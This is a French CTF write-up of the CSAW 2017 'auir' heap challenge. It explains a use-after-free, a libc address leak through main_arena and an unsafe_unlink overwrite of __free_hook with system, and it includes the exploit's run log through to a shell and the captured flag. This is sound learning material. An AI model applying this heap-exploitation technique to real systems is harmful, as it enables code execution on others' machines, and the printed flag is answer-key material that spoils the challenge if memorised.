---
layout: post
title: "CSAW CTF"
date: 18 Septembre 2017
comments: true
categories: wu
---
```
 ===== INFOS ===== 
Filename                 auir
File format              ELF64
Architecture             x86-64
Endianess                little endian
Entry point              0x400da0
Loadables segments       2
Sections                 28

NX bit                   enabled
SSP                      disabled
Relro                    partial
RPATH                    no rpath
RUNPATH                  no runpath
PIE                      disabled
```
Le binaire présente plusieurs failles:

1) Un tableau de pointeur vers des zones dans le tas (heap) voit ses entrées
mises par incrément, toujours accessibles et jamais effacées. Cela permet un
use after free.

2) la possibilité d'adresser des pointeurs en dehors du tableau (cela s'est
avérée inutile)

L'idée générale consiste à creer un gros bloc puis à le supprimer et à créer
des plus petis blocs qui seront à l'intérieur de ce gros bloc. La possibilité
d'editer et de visualiser le gros bloc permet de modifier les entêtes des
chunks et de recupèrer les adresses du tas (inutile) et de la main_arena
donc de la libc.

Un unsafe_unlink est utilisée pour pour éditer le pointeur d'un des zealot
et de le faire pointer vers __free_hook ou on met l'adresse de system.

La destruction d'un zealot s'appelant /bin/sh permet d'obtenir un shell.

```
[*] '/home/francois/BFF/beers4flags/writeups/2017/csaw2017/pwn/auir/auir'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/francois/BFF/beers4flags/writeups/2017/csaw2017/pwn/auir/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[x] Opening connection to pwn.chal.csaw.io on port 7713
[x] Opening connection to pwn.chal.csaw.io on port 7713: Trying 216.165.2.35
[+] Opening connection to pwn.chal.csaw.io on port 7713: Done
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
destroy  0
look at 0
[+] arena= 0x7fe1dbaffb78
[+] system= 0x7fe1db780390
system  =  0x7fe1db780390
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
destroy  4
destroy  5
look at 5
[+] heap= 0xb13c20
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
destroy  7
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
[*]WHCIH ONE DO YOU WANT TO FIX ?
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
[*]FIXED ZEALOT NUMBER:7
[*]FIXED ZEALOT SIZE:1024
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
destroy  9
le numéro 8 pointe sur le numéro 5
look at 5
[*]SHOWING....
x[code hexa divers]|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
[*]WHCIH ONE DO YOU WANT TO FIX ?
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
[*]WHCIH ONE DO YOU WANT TO FIX ?
>>
[*]SPECIFY THE SIZE OF ZEALOT
>>
[*]GIVE SOME SKILLS TO ZEALOT
>>
destroy  2
[*] Switching to interactive mode
[*]BREAKING....
$ cat flag
flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
$ exit
[*]SUCCESSFUL!
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
```
